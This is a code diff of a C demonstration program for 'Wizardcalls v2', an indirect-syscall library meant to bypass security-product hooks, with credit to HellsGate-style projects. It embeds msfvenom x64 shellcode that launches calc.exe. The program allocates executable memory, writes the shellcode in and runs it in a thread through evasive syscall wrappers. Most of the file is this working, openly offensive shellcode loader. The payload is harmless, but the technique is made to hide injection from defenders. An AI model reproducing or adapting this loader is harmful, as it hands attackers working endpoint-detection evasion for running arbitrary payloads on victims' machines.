@@ -1,10 +1,21 @@
-# include "../Include/wizardcalls.h"
+/*
+	Wizardcalls v2. An indirect syscall utility with hook bypassing capabilities.
+
+	Based on:
+		https://github.com/am0nsec/HellsGate
+		https://github.com/Maldev-Academy/HellHall
+		https://github.com/trickster0/TartarusGate
+*/
 # include <stdio.h>
+# include "../Include/wizardcalls.h"
+
+# define print(msg, ...) printf( "[DEBUG]::Wizardcalls.%s.L%d -> " msg "\n", __func__, __LINE__, ##__VA_ARGS__ )
 
 int main() 
 {
 	/* msfvenom -p windows/x64/exec cmd=calc.exe exitfunc=thread */
-	char Shellcode[] = {
+	char Shellcode[] = 
+	{
 		0xfc, 0x48, 0x83, 0xe4, 0xf0, 0xe8, 0xc0, 0x00, 0x00, 0x00, 0x41, 0x51, 0x41, 0x50, 0x52, 0x51,
 		0x56, 0x48, 0x31, 0xd2, 0x65, 0x48, 0x8b, 0x52, 0x60, 0x48, 0x8b, 0x52, 0x18, 0x48, 0x8b, 0x52,
 		0x20, 0x48, 0x8b, 0x72, 0x50, 0x48, 0x0f, 0xb7, 0x4a, 0x4a, 0x4d, 0x31, 0xc9, 0x48, 0x31, 0xc0,
@@ -25,7 +36,6 @@ int main()
 		0x65, 0x78, 0x65, 0x00
 	};
 
-	
 	NTSTATUS	Status		= 0;
 	PVOID		pShellcode	= 0;
 	SIZE_T		Size		= sizeof( Shellcode );
@@ -39,41 +49,41 @@ int main()
 
 	if ( ( Status = WzDAllocateVirtualMemory( ( HANDLE )-1, &pShellcode, 0, &Size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE ) ) != NT_SUCCESS )
 	{ 
-		wc_dbg("NtAllocateVirtualMemory failed 0x%0.8X", Status);
+		print("NtAllocateVirtualMemory failed 0x%0.8X", Status);
 		return -1;
 	}
 
-	wc_dbg("Allocated memory at 0x%p", pShellcode);
+	print( "Allocated memory at 0x%p", pShellcode );
 
 	if ( ( Status = WzDWriteVirtualMemory( ( HANDLE )-1, pShellcode, Shellcode, sizeof( Shellcode ), &Written ) ) != NT_SUCCESS || Written != sizeof( Shellcode ) )
 	{
-		wc_dbg( "NtWriteVirtualMemory fail 0x%0.8X", Status);
+		print( "NtWriteVirtualMemory fail 0x%0.8X", Status);
 		return -1;
 	}
 	
-	wc_dbg( "Wrote %zu bytes to buffer", Size );
+	print( "Wrote %zu bytes to buffer", Size );
 
 	if ( ( Status = WzDCreateThread( &hThread, THREAD_ALL_ACCESS, 0, ( HANDLE )-1, ( LPTHREAD_START_ROUTINE )pShellcode, 0, 0, 0, 0, 0, 0 ) ) != NT_SUCCESS )
 	{
-		wc_dbg("NtCreateThreadEx failed with error: 0x%0.8X", Status);
+		print( "NtCreateThreadEx failed with error: 0x%0.8X", Status );
 		return -1;
 	}
 
-	wc_dbg( "Executed payload!" );
+	print( "Executed payload!" );
 
 	if ( ( Status = WzDWaitForSingleObject( hThread, FALSE, NULL ) ) != NT_SUCCESS )
 	{
-		wc_dbg("NtWaitForSingleObject failed with error: 0x%0.8X", Status);
+		print( "NtWaitForSingleObject failed with error: 0x%0.8X", Status );
 		return -1;
 	}
 
 	if ( ( Status = WzDFreeVirtualMemory( ( HANDLE )-1, &pShellcode, &Size, MEM_RELEASE ) ) != NT_SUCCESS )
 	{
-		wc_dbg( "NtFreeVirtualMemory failed with error: 0x%0.8X", Status );
+		print( "NtFreeVirtualMemory failed with error: 0x%0.8X", Status );
 		return -1;
 	}
 
-	wc_dbg( "Exited cleanly." );
+	print( "Exited cleanly." );
 
 	return 0;
 }
